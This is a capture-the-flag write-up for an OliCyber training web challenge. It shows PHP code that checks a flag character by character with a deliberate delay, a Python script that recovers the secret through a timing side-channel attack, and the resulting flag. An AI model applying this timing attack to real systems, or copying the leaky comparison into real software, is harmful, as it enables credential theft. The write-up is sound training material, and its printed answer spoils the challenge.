## Challenge Name: Time is key
**Category:** Web

**Challenge Description:** 
In this challenge, participants must quickly retrieve the flag from the given website. The flag consists only of lowercase letters and numbers. Additionally, the flag is not in the standard format, so it should be enclosed in `flag{...}`.

Website: [Time is key Challenge](http://time-is-key.challs.olicyber.it)

### Approach

The website tries the flag provided and 'answer' if is the correct flag or not.
This is the code of the server:

**Server Code:**
```php
<?php
    $flag = getenv("flag");

    if (isset($_POST["flag"]) && !is_array($_POST["flag"])){
        $your_flag = $_POST["flag"];
        $flag_len = 6;
        
        if (strlen($your_flag) !== $flag_len){
            die("Sbagliato! :(");
        }

        for ($i = 0; $i < $flag_len; $i++){
            if ($your_flag[$i] !== $flag[$i]){
                die("Sbagliato! :(");
            }
            usleep(1000000);
        }

        die("Che stai aspettando? Invia la flag!");
    }

    
    if (isset($_GET["show_source"])){
        highlight_file("vulnerable.php");
    }
?>
```

Participants need to send requests to the provided website and analyze the response times to infer each character of the flag. The provided Python script iterates through each position of the flag and tries all printable characters for each position. If the response time exceeds a certain threshold, the character is added to the flag. This process continues until the full flag is obtained.

**Solution [here](/olicyber-training/web/Time-is-key/solve.py):**

```
import requests
import string

url = "http://time-is-key.challs.olicyber.it/index.php"

def infer_flag():
    flag = ""

    print("Starting flag inference process...")

    while len(flag) < 6:
        print(f"Trying characters for position {len(flag) + 1}...")

        found = False
        
        for char in string.printable:
            if char not in string.whitespace:
                payload = {'flag': flag + char + 'a' * (5 - len(flag))}
                response = requests.post(url, data=payload)
                
                if response.elapsed.total_seconds() > 1 + len(flag):
                    flag += char
                    print(f"Found character for position {len(flag)}: {char}")
                    found = True
                    break
                else:
                    print(f"No character found for position {len(flag) + 1}: {char}")
        
        if not found:
            print(f"No valid character found for position {len(flag) + 1}")
            break

    print("Flag inference process completed!")
    return flag

print("Inferred flag:", infer_flag())
```

**Flag:**

```
flag{71m1n6}
```

### Reflections

This challenge emphasizes the importance of response time analysis in web exploitation challenges. It provides practice in crafting efficient scripts to automate the retrieval of sensitive information from web servers.

---
<a href="/olicyber-training/main.md" class="btn">Back to home</a>